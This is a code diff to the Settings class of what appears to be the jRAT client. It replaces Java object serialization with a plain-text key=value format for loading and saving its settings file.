@@ -1,10 +1,12 @@
 package su.jrat.client.settings;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
+import java.io.PrintWriter;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -44,25 +46,57 @@ public class Settings extends AbstractSettings {
 		settings.put(key, value);
 	}
 
-	@SuppressWarnings("unchecked")
 	public void load() throws Exception {
 		try {
-			ObjectInputStream str = new ObjectInputStream(new FileInputStream(getFile()));
-			settings = (HashMap<String, Object>) str.readObject();
-			str.close();
-		} catch (Exception e) {
-			e.printStackTrace();
+			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(getFile())));
+			
+			reader.readLine();
+			int len = Integer.parseInt(reader.readLine());
+			
+			for (int i = 0; i < len; i++) {
+				String data = reader.readLine();
+				String[] split = data.split("=");
+				String key = split[0];
+				String rawValue = split[1];
+				
+				Object value = null;
+				
+				try {
+					value = Integer.parseInt(rawValue);
+				} catch (Exception ex) { }
+				
+				if (value == null) {
+					value = rawValue;
+				}
+				
+				settings.put(key, value);
+			}
+	
+			reader.close();
+		} catch (Exception ex) {
+			ex.printStackTrace();
 		}
-
+		
 		if (settings.size() == 0) {
 			addDefault();
 		}
 	}
 
 	public void save() throws Exception {
-		ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(getFile()));
-		str.writeObject(settings);
-		str.close();
+		try {
+			PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(getFile())));
+			
+			pw.println("jRAT settings");
+			pw.println(settings.size());
+			
+			for (String s : settings.keySet()) {
+				pw.println(s + "=" + settings.get(s).toString());
+			}
+			
+			pw.close();
+		} catch (Exception ex) {
+			ex.printStackTrace();
+		}
 	}
 
 	public void addDefault() {
